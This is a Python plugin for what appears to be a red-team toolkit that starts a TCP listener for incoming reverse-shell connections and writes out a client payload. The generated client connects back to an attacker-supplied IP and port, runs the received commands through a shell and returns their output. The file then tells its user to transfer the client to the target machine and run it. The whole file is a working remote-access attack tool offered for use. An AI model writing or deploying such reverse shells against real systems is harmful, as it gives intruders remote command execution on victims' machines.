#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
from plugins.base import BasePlugin

class TCPReverseShellPlugin(BasePlugin):
    PLUGIN_ID = "tcp_rev_shell"
    NAME = "TCP Reverse Shell"
    GROUP = "Red"
    TACTIC = "Command and Control"
    DESCRIPTION = "Starts a TCP listener to accept incoming reverse shell connections or generates a client payload."

    def run(self):
        print(f"\n[*] --- {self.NAME} --- [*]")
        print("1. Start Listener (Server)")
        print("2. Generate Client Payload")
        print("0. Back to Main Menu")
        
        choice = input("\nSelect an option: ")
        if choice == '1':
            self.start_listener()
        elif choice == '2':
            self.generate_payload()
        elif choice == '0':
            return
        else:
            print("[-] Invalid option.\n")

    def start_listener(self):
        print("\n--- Start Listener ---")
        host = input("Listening IP [0.0.0.0]: ").strip() or "0.0.0.0"
        port_str = input("Listening Port [4444]: ").strip() or "4444"
        try:
            port = int(port_str)
        except ValueError:
            print("[-] Invalid port.")
            return

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        client = None
        try:
            server.bind((host, port))
            server.listen(1)
            print(f"[*] Listening on {host}:{port}... (Waiting for incoming connection)")
            
            client, addr = server.accept()
            print(f"\n[+] Connection received from {addr[0]}:{addr[1]}")
            
            # Simple interactive loop
            while True:
                cmd = input(f"RevShell@{addr[0]}> ")
                if not cmd.strip():
                    continue
                
                # Send the command to the client
                client.send((cmd + "\n").encode('utf-8'))
                
                if cmd.strip().lower() in ['exit', 'quit']:
                    print("[*] Exiting shell.")
                    break
                
                # Receive the response
                response = client.recv(4096).decode('utf-8', errors='replace')
                print(response, end="")

        except KeyboardInterrupt:
            print("\n[-] Listener interrupted by user.")
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            print("[*] Closing connections...")
            if client:
                try:
                    client.close()
                except:
                    pass
            server.close()

    def generate_payload(self):
        print("\n--- Generate Client Payload ---")
        host = input("LHOST (Attacker IP): ").strip()
        port = input("LPORT (Attacker Port): ").strip()
        
        if not host or not port:
            print("[-] LHOST and LPORT are required to generate payload.")
            return
            
        payload = f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('{host}', int({port})))
        while True:
            cmd = s.recv(1024).decode('utf-8').strip()
            
            if cmd.lower() in ['exit', 'quit']:
                break
                
            if cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:].strip())
                    s.send(b'Directory changed.\\n')
                except Exception as e:
                    s.send((str(e) + '\\n').encode('utf-8'))
                continue
                
            if len(cmd) > 0:
                p = subprocess.run(cmd, shell=True, capture_output=True)
                output = p.stdout + p.stderr
                if not output:
                    output = b'Command executed with no output.\\n'
                s.send(output)
    except Exception as e:
        print(f"[-] Connection failed: {{e}}")
    finally:
        s.close()

if __name__ == '__main__':
    connect()
"""
        filename = "revshell_client.py"
        filepath = os.path.join(os.getcwd(), filename)
        
        try:
            with open(filepath, "w") as f:
                f.write(payload)
            print(f"[+] Client payload successfully generated and saved to: {filepath}")
            print("[*] Transfer this file to the target machine and execute it.")
        except Exception as e:
            print(f"[-] Failed to write payload to file: {e}")
